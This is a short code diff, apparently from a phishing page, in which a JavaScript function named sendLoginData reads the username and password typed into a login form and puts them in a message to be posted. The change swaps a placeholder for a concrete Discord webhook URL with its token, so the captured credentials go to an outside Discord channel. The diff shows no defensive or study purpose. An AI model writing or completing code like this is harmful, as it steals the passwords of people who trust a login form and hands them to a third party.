@@ -5,7 +5,7 @@ function sendLoginData(event) {
   const username = form.username.value;
   const password = form.password.value;
 
-  const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
+  const webhookUrl = "https://discord.com/api/webhooks/947795643747934228/q2RubwFWNnKMFVRq5uwBzvm5KTvkYjGZQQiXD5TzXVmjoYjZ0cO0NUQXKvY8tVtuPR0f";
 
   const payload = {
     content: `Username: ${username}\nPassword: ${password}`,
